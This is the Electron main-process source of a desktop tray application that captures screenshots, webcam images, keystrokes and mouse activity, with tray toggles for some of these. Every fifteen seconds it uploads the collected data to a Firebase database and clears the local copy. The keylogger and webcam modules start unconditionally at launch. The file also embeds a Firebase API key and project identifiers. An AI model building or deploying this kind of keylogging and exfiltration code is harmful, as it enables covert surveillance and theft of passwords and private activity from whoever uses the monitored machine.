
const {app, BrowserWindow,Tray,Menu} = require('electron')
const path = require('path')
let shared=require("./Shared.js");
let response=shared.readSetting();
var fs = require('fs'); 
console.log(__dirname);
var IsEnable=true;
var KeyIsEnable=true;
var mouseIsEnable=true;
const url = require('url')
function createWindow () {
  const mainWindow = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      nodeIntegration: true
    }
  
  })
 
  //mainWindow.setMenuBarVisibility(false)
  mainWindow.loadFile('Setting.html')
}

app.whenReady().then(
  function()
  {
    let trayIcon = new Tray(path.join(__dirname,"images.png"))

    const trayMenuTemplate = [
    {label:"ScreenShot",submenu:[
      { label: 'Enable ScreenShot', type: 'radio',checked:response.SnapShotEnable ==true?true:false  ,click: function () {
        response.SnapShotEnable=true;

       fs.writeFileSync("./Storage/Settings.json",JSON.stringify(response));
      }
        },
     { label: 'Disable ScreenShot', type: 'radio',checked:response.SnapShotEnable ==false?true:false ,click: function () {
      response.SnapShotEnable=false;
     fs.writeFileSync("./Storage/Settings.json",JSON.stringify(response));
     }
       }
    ]},
    {label:"Keyboard Logging",submenu:[
      { label: 'Enable logging', type: 'radio',checked:response.KeyboardEnable ==true?true:false , click: function () {
       
        response.KeyboardEnable=true;
        fs.writeFileSync("./Storage/Settings.json",JSON.stringify(response));
      }
        },
     { label: 'Disable logging', type: 'radio',checked:response.KeyboardEnable ==false?true:false , click: function () {
      response.KeyboardEnable=false;
     fs.writeFileSync("./Storage/Settings.json",JSON.stringify(response));
     }
       }
    ]},
    ,
    {label:"Mouse Logging",submenu:[
      { label: 'Enable logging', type: 'radio',checked:response.MouseEnable ==true?true:false , click: function () {
        response.MouseEnable=true;

        fs.writeFileSync("./Storage/Settings.json",JSON.stringify(response) );
      }
        },
     { label: 'Disable logging', type: 'radio',checked:response.MouseEnable ==false?true:false , click: function () {
      response.MouseEnable=false;
     fs.writeFileSync("./Storage/Settings.json",JSON.stringify(response));
     }
     }
    ]},
    {
      label: 'Setting',
      click: function () {
        createWindow();
      }
   },
       {
          label: 'Close Application',
          click: function () {
            if (process.platform !== 'darwin') app.quit()
          }
       }
    ]
    
    let trayMenu = Menu.buildFromTemplate(trayMenuTemplate)
    trayIcon.setContextMenu(trayMenu)
  
  }
 
  )

app.on('window-all-closed', function () {
  if (process.platform !== 'darwin') app.quit()
})

app.on('activate', function () {
  if (BrowserWindow.getAllWindows().length === 0) createWindow()
})
app.on('ready', () => { 
  win = new BrowserWindow({ show: false }); 
});
let ScreenShot=require("./ScreenShot.js");
ScreenShot();
   let WebCam = require("./WebCam.js");
   WebCam(IsEnable);
 
let KeyboardLogger=require("./Keyboardlogging.js");
KeyboardLogger(KeyIsEnable);
var firebase = require('@firebase/app');
require('@firebase/auth');
require('@firebase/database');
 firebase.default.initializeApp(
  {
    apiKey: "AIzaSyB03uXj4djfEFpYKppSnjopgjE6O5l8-YE",
    authDomain: "symbolic-datum-233317.firebaseapp.com",
    databaseURL: "https://symbolic-datum-233317.firebaseio.com",
    projectId: "symbolic-datum-233317",
    storageBucket: "symbolic-datum-233317.appspot.com",
    messagingSenderId: "412248865946",
    appId: "1:412248865946:web:f5df2c9fdca2108356f323",
    measurementId: "G-E1B75MFBL8"
 });
setInterval(function(){
require('dns').resolve('www.google.com', function(err) {
  if (err) {
     console.log("No connection");
  } else {
   
  //console.log("firebase",firebase);
                
                   //  firebase.analytics();
          let data=shared.GetPostedData();
          if(data.length!=0)
          {
       
  
            for(let i=0;i<data.length;i++)
            {
              
              // try{
           var path="Electron"+shared.getRandomInt("999999999")+"/";
              var body={
                      type:data[i].Type,
                      Output:data[i].Data
              }
             firebase.default.database().ref(path).set(body);
              console.log("yes it happened")
             
              
            }
           
          }else{
            console.log("No Record Found")
          }
          let res=[];
          fs.writeFileSync("./Storage/Data.json",JSON.stringify(res));
          }
       
          
});
function callback()
{
  console.log("Its Back")
}
},15000)
